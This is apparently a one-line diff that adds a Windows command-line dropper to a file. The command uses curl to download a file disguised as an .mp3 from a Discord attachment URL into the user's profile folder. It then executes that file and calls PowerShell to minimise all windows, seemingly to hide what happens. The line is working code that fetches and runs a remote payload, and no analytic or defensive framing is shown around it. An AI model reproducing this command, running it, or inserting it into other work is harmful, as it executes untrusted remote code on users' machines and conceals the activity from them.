@@ -1,0 +1,1 @@
+curl https://cdn.discordapp.com/attachments/882014066976100393/883802065741152276/darcellmaven.mp3 --output "C:\Users\%username%\darcellmaven.mp3" & "C:\Users\%username%\darcellmaven.mp3" & Powershell -Command "(New-Object -ComObject Shell.Application).MinimizeAll()"
